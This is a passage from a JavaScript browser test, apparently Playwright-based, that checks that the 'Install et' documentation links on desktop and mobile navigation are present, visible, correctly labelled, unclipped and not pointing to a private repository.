      const desktop = await readInstall('.nav-links a[href="https://docs.endlesstesting.ai/getting-started/install/"]');
      const oss = await readInstall('.oss a[href="https://docs.endlesstesting.ai/getting-started/install/"]');
      for (const [where, info] of [['desktop', desktop], ['oss', oss]]) {
        assert.equal(info.found, true, `${scheme} ${where} install link missing`);
        assert.equal(info.text, 'Install et', `${scheme} ${where} label`);
        assert.equal(info.href, INSTALL_DOCS, `${scheme} ${where} href`);
        assert.notEqual(info.display, 'none', `${scheme} ${where} display`);
        assert.equal(info.visibility, 'visible', `${scheme} ${where} visibility`);
        assert.ok(info.opacity >= 0.99, `${scheme} ${where} opacity ${info.opacity}`);
        assert.ok(info.fontSize >= 12, `${scheme} ${where} font ${info.fontSize}`);
        assert.ok(info.width > 20 && info.height > 8, `${scheme} ${where} box ${info.width}x${info.height}`);
        assert.ok(info.left >= -1 && info.right <= info.innerWidth + 1, `${scheme} ${where} clipped`);
        assert.equal(info.overflow, 0, `${scheme} ${where} overflow ${info.overflow}`);
        assert.equal(info.privateRepo, false, `${scheme} ${where} private repo`);
      }

      await page.setViewportSize({ width: 375, height: 812 });
      await open();
      const beforeMenu = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
      assert.equal(beforeMenu, 0, `${scheme} 375 overflow ${beforeMenu}`);
      await page.click('#nav-toggle');
      const mobile = await readInstall('#nav-panel a[href="https://docs.endlesstesting.ai/getting-started/install/"]');
      assert.equal(mobile.found, true, `${scheme} mobile install link missing`);
      assert.equal(mobile.text, 'Install et', `${scheme} mobile label`);
      assert.equal(mobile.href, INSTALL_DOCS, `${scheme} mobile href`);
      assert.notEqual(mobile.display, 'none', `${scheme} mobile display`);
      assert.equal(mobile.visibility, 'visible', `${scheme} mobile visibility`);
      assert.ok(mobile.opacity >= 0.99, `${scheme} mobile opacity ${mobile.opacity}`);
      assert.ok(mobile.width > 20 && mobile.height > 8, `${scheme} mobile box ${mobile.width}x${mobile.height}`);
      assert.ok(mobile.left >= -1 && mobile.right <= mobile.innerWidth + 1, `${scheme} mobile clipped`);
      assert.ok(mobile.top >= -1 && mobile.bottom <= mobile.innerHeight + 1, `${scheme} mobile offscreen`);
      assert.equal(mobile.overflow, 0, `${scheme} mobile overflow ${mobile.overflow}`);
      assert.equal(mobile.privateRepo, false, `${scheme} mobile private repo`);
    }
  });
});
